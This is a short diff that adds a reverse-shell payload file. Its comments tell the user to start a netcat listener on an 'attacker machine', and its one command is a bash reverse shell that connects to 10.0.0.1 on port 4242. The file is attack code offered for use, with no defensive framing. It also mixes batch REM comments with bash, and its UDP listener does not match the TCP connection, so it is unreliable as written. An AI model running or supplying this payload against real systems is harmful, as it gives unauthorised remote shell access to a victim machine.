@@ -1,0 +1,4 @@
+REM Create a listener on the attacker machine: nc -u -lvp 4242
+REM This has not been tested. Use at your own risk
+
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
